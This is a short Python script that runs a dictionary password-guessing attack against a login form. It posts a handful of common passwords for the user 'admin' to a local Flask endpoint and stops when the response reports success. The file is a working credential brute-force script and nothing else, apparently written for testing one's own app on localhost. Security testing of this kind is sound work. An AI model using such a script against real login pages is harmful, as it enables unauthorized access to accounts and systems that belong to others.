import requests

url = 'http://127.0.0.1:5000/login'  # Target your Flask app
username = 'admin'
password_list = ['123', 'admin', 'password', 'admin123', 'toor']

for pwd in password_list:
    response = requests.post(url, data={'username': username, 'password': pwd})
    print(f"Trying {pwd} --> {response.text}")
    if "successfully" in response.text:
        print(f"\n✅ Password found: {pwd}")
        break
